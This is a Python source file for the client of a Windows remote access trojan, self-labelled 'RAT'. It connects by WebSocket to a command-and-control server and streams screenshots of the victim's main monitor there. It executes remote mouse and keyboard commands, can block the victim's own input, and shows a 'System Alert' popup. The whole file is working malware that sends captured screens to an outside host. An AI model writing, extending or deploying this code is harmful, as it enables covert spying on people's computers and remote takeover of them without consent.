import tkinter as tk
from tkinter import messagebox
import threading
import time
import winsound
import json
import asyncio
import websockets
from mss import mss
from PIL import Image
import pyautogui
import io
import ctypes

# --- Global state variables ---
GUI_ROOT = None
RAT_ACTIVE = False

def init_gui(root):
    global GUI_ROOT
    GUI_ROOT = root

# --- Standard Live Actions ---
def show_popup(text):
    if GUI_ROOT: GUI_ROOT.after(0, lambda: messagebox.showinfo("System Alert", text))
# ... (other non-RAT actions like noise, overlay would go here if needed) ...

def block_input_for_duration(seconds=5):
    """Blocks user input for a specified duration. REQUIRES ADMIN."""
    try:
        ctypes.windll.user32.BlockInput(True)
        print(f"[*] Input blocked for {seconds} seconds.")
        time.sleep(seconds)
        ctypes.windll.user32.BlockInput(False)
        print("[*] Input unblocked.")
    except Exception as e:
        print(f"[!] Failed to block input (requires admin rights): {e}")

# --- RAT Session Logic ---
async def rat_session(session_id, c2_url):
    """The main loop for the remote desktop session."""
    global RAT_ACTIVE
    RAT_ACTIVE = True
    
    ws_url = c2_url.replace('https', 'wss') + f"/ws/rat/{session_id}"
    print(f"[*] Starting RAT session. Connecting to {ws_url}")

    async with websockets.connect(ws_url) as websocket:
        print("[+] RAT WebSocket connected.")
        
        # Create two concurrent tasks: one for sending, one for receiving
        recv_task = asyncio.create_task(receive_commands(websocket))
        send_task = asyncio.create_task(send_frames(websocket))
        
        # Wait for either task to complete (which they shouldn't unless connection is lost)
        await asyncio.wait([recv_task, send_task], return_when=asyncio.FIRST_COMPLETED)

async def receive_commands(websocket):
    """Listens for and executes commands from the C2."""
    async for message in websocket:
        try:
            cmd = json.loads(message)
            action = cmd.get("action")
            
            if action == "mouse_move":
                pyautogui.moveTo(cmd['x'], cmd['y'])
            elif action == "mouse_click":
                pyautogui.click(button=cmd.get('button', 'left'))
            elif action == "key_press":
                pyautogui.press(cmd['key'])
            elif action == "key_type":
                pyautogui.typewrite(cmd['text'])
            elif action == "block_input":
                threading.Thread(target=block_input_for_duration, args=(5,)).start()
                
        except Exception:
            pass # Ignore malformed commands

async def send_frames(websocket):
    """Captures and sends screen frames to the C2."""
    quality = 75 # Default JPEG quality
    scale = 1.0  # Default resolution scale (full)

    with mss() as sct:
        while RAT_ACTIVE:
            monitor = sct.monitors[1] # Main monitor
            
            # Capture the screen
            img = sct.grab(monitor)
            img_pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
            
            # Apply performance settings (future implementation)
            # For now, we use defaults
            
            # Convert to JPEG in memory
            with io.BytesIO() as buffer:
                img_pil.save(buffer, format="JPEG", quality=quality)
                frame_data = buffer.getvalue()
            
            await websocket.send(frame_data)
            await asyncio.sleep(1 / 15) # Cap at ~15 FPS